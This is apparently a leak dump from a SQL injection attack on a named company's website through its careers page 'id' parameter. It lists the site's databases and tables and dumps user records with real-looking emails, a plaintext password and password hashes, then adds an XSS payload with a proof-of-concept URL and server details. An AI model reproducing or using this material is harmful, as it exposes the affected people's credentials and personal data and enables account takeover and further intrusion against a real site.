.com 	Commercial

IT Services and Software Development company - BlueboxInfosoft Pvt. Ltd.

http://www.blueboxinfosoft.com/careers/job.php?id=16

the back-end DBMS is MySQL
web application technology: LiteSpeed, PHP
the back-end DBMS: MySQL >= 5.0 (MariaDB fork)

available databases [5]:                                                                                                                                             
[+] information_schema
[+] itsguru_blueboxi_blueboxinfosoft
[+] itsguru_blueboxi_blueboxphp
[+] itsguru_blueboxi_tweetshare_api
[+] itsguru_blueboxi_wp

Database: itsguru_blueboxi_tweetshare_api                                                                                                                            
[3 tables]
+----------------+
| user           |
| tweet_test     |
| tweetshare_api |
+----------------+

Database: itsguru_blueboxi_tweetshare_api
Table: user
[1 entry]
+----+----------+-------------+
| id | username | password    |
+----+----------+-------------+
| 1  | uhpatel  | !India@2141 |
+----+----------+-------------+

Database: itsguru_blueboxi_blueboxphp                                                                                                                                
[6 tables]
+-------------+
| user        |
| career_user |
| gallery     |
| jobs        |
| meta        |
| pages       |
+-------------+

Database: itsguru_blueboxi_blueboxphp
Table: user
[1 entry]
+-----------+----------+-----------------------------+----------------------------------+
| firstname | lastname | email                       | password                         |
+-----------+----------+-----------------------------+----------------------------------+
| admin     | admin    | contact@blueboxinfosoft.com | 2d6259a63c86c2efec54e9ff68dbc9c0 |
+-----------+----------+-----------------------------+----------------------------------+

Database: itsguru_blueboxi_wp                                                                                                                                        
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+

Database: itsguru_blueboxi_wp
Table: wp_users
[1 entry]
+------------+---------------+-------------------+------------------------------------+
| user_login | user_nicename | user_email        | user_pass                          |
+------------+---------------+-------------------+------------------------------------+
| jQAWbgRbla | jqawbgrbla    | patel@itsguru.com | $P$BVI.D0zdrv19qxBhHcYYveY9u2HY831 |
+------------+---------------+-------------------+------------------------------------+

Database: itsguru_blueboxi_blueboxinfosoft                                                                                                                           
[111 tables]
+------------------------------------------------------+
| wp_commentmeta                                       |
| wp_comments                                          |
| wp_eafl_clicks                                       |
| wp_flag_album                                        |
| wp_flag_comments                                     |
| wp_flag_gallery                                      |
| wp_flag_pictures                                     |
| wp_fw_termmeta                                       |
| wp_huge_it_videogallery_galleries                    |
| wp_huge_it_videogallery_videos                       |
| wp_huge_itgallery_gallerys                           |
| wp_huge_itgallery_images                             |
| wp_huge_itgallery_like_dislike                       |
| wp_layerslider                                       |
| wp_links                                             |
| wp_options                                           |
| wp_postmeta                                          |
| wp_posts                                             |
| wp_responsive_video_gallery_plus_responsive_lightbox |
| wp_revslider_css                                     |
| wp_revslider_layer_animations                        |
| wp_revslider_navigations                             |
| wp_revslider_settings                                |
| wp_revslider_sliders                                 |
| wp_revslider_slides                                  |
| wp_revslider_static_slides                           |
| wp_smush_dir_images                                  |
| wp_snp_log                                           |
| wp_snp_stats                                         |
| wp_spamclean_comments_data                           |
| wp_swarm_effects                                     |
| wp_swarm_effects_display_rules                       |
| wp_term_relationships                                |
| wp_term_taxonomy                                     |
| wp_termmeta                                          |
| wp_terms                                             |
| wp_translations                                      |
| wp_translations_log                                  |
| wp_tweetshare_licence                                |
| wp_tweetshare_post_view_click                        |
| wp_unitegallery_categories                           |
| wp_unitegallery_galleries                            |
| wp_unitegallery_items                                |
| wp_usermeta                                          |
| wp_users                                             |
| wp_wfBadLeechers                                     |
| wp_wfBlockedCommentLog                               |
| wp_wfBlockedIPLog                                    |
| wp_wfBlocks                                          |
| wp_wfBlocksAdv                                       |
| wp_wfConfig                                          |
| wp_wfCrawlers                                        |
| wp_wfFileMods                                        |
| wp_wfHits                                            |
| wp_wfHoover                                          |
| wp_wfIssues                                          |
| wp_wfKnownFileList                                   |
| wp_wfLeechers                                        |
| wp_wfLockedOut                                       |
| wp_wfLocs                                            |
| wp_wfLogins                                          |
| wp_wfNet404s                                         |
| wp_wfNotifications                                   |
| wp_wfPendingIssues                                   |
| wp_wfReverseCache                                    |
| wp_wfSNIPCache                                       |
| wp_wfScanners                                        |
| wp_wfStatus                                          |
| wp_wfThrottleLog                                     |
| wp_wfVulnScanners                                    |
| wp_wfbadleechers                                     |
| wp_wfblockediplog                                    |
| wp_wfblocks                                          |
| wp_wfblocksadv                                       |
| wp_wfconfig                                          |
| wp_wfcrawlers                                        |
| wp_wffilemods                                        |
| wp_wfhits                                            |
| wp_wfhoover                                          |
| wp_wfissues                                          |
| wp_wfknownfilelist                                   |
| wp_wfleechers                                        |
| wp_wflockedout                                       |
| wp_wflocs                                            |
| wp_wflogins                                          |
| wp_wfnet404s                                         |
| wp_wfnotifications                                   |
| wp_wfpendingissues                                   |
| wp_wfreversecache                                    |
| wp_wfscanners                                        |
| wp_wfsnipcache                                       |
| wp_wfstatus                                          |
| wp_wfthrottlelog                                     |
| wp_wfvulnscanners                                    |
| wp_woocommerce_api_keys                              |
| wp_woocommerce_attribute_taxonomies                  |
| wp_woocommerce_downloadable_product_permissions      |
| wp_woocommerce_log                                   |
| wp_woocommerce_order_itemmeta                        |
| wp_woocommerce_order_items                           |
| wp_woocommerce_payment_tokenmeta                     |
| wp_woocommerce_payment_tokens                        |
| wp_woocommerce_sessions                              |
| wp_woocommerce_shipping_zone_locations               |
| wp_woocommerce_shipping_zone_methods                 |
| wp_woocommerce_shipping_zones                        |
| wp_woocommerce_software_licence                      |
| wp_woocommerce_tax_rate_locations                    |
| wp_woocommerce_tax_rates                             |
| wp_yoast_seo_links                                   |
| wp_yoast_seo_meta                                    |
+------------------------------------------------------+

Database: itsguru_blueboxi_blueboxinfosoft
Table: wp_users
[4 entries]
+--------------+---------------+------------------------+------------------------------------+
| user_login   | user_nicename | user_email             | user_pass                          |
+--------------+---------------+------------------------+------------------------------------+
| uhpatel      | uhpatel       | urvi1234@gmail.com     | $P$B7qBb/XsXoFQLBzivTq9Yms.GlCsSu. |
| hpatel       | hpatel        | patel@itsguru.com      | $P$B2D3VtPcJ75x6ZJfyR2NEtqEoRwUT0/ |
| andypatel877 | andypatel877  | andypatel877@gmail.com | $P$B42LSf0WsS7eP0L.lxjhnNnhB6/B8P1 |
| itsguru      | itsguru       | sales@itsguru.com      | $P$BSVRnslkCevZlYEZbRvW3Vu.h67pXy0 |
+--------------+---------------+------------------------+------------------------------------+

+----------+-----------------------------+----------------------------------+
| UserName | Email                       | Password                         |
+----------+-----------------------------+----------------------------------+
| admin    | contact@blueboxinfosoft.com | 2d6259a63c86c2efec54e9ff68dbc9c0 |
| uhpatel  |                             | !India@2141                      |
+----------+-----------------------------+----------------------------------+

[+] Payload: <input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">

[*] POC: http://www.blueboxinfosoft.com/careers/job.php?id=<input type="hidden" name="job_id" value="">Xss<svg/onload=confirm(/Xss/)>web">

A2 Hosting, Inc.

LiteSpeed V7.6

/home/itsguru/public_html/

webmaster@blueboxinfosoft.com

MariaDB

PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit

Linux server.blueboxinfosoft.com 2.6.32-042stab141.3 #1 SMP Fri Nov 15 22:45:34 MSK 2019 x86_64
